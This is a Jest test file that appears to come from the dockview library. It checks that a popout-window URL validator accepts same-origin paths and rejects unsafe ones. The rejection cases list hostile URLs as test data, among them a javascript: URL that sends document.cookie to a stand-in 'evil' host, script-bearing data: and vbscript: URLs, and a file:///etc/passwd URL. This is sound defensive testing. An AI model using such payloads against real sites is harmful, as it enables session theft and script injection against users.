import { assertSameOriginPopoutUrl } from '../popoutWindow';

describe('assertSameOriginPopoutUrl', () => {
    // jsdom defaults window.location.href to 'http://localhost/'

    describe('accepts same-origin URLs', () => {
        test.each([
            '/popout.html',
            './popout.html',
            'popout.html',
            '/path/to/popout.html?a=1#fragment',
            'http://localhost/popout.html',
            'http://localhost/',
        ])('accepts %s', (url) => {
            expect(() => assertSameOriginPopoutUrl(url)).not.toThrow();
        });
    });

    describe('rejects unsafe URLs', () => {
        test.each([
            // The headline class — javascript: would execute in a context the
            // browser still associates with the opener.
            ['javascript:alert(1)'],
            ["javascript:fetch('https://evil/?c='+document.cookie)"],
            // Data and blob URLs can carry arbitrary HTML/JS.
            ['data:text/html,<script>alert(1)</script>'],
            ['blob:http://localhost/abc-123'],
            // Legacy script protocol.
            ['vbscript:msgbox(1)'],
            // Cross-origin: different host, different port, different scheme.
            ['https://evil.com/popout.html'],
            ['http://attacker.example/popout.html'],
            ['http://localhost:8080/popout.html'],
            ['https://localhost/popout.html'],
            // file: protocol.
            ['file:///etc/passwd'],
        ])('rejects %s', (url) => {
            expect(() => assertSameOriginPopoutUrl(url)).toThrow(
                /dockview: popout URL/
            );
        });
    });
});
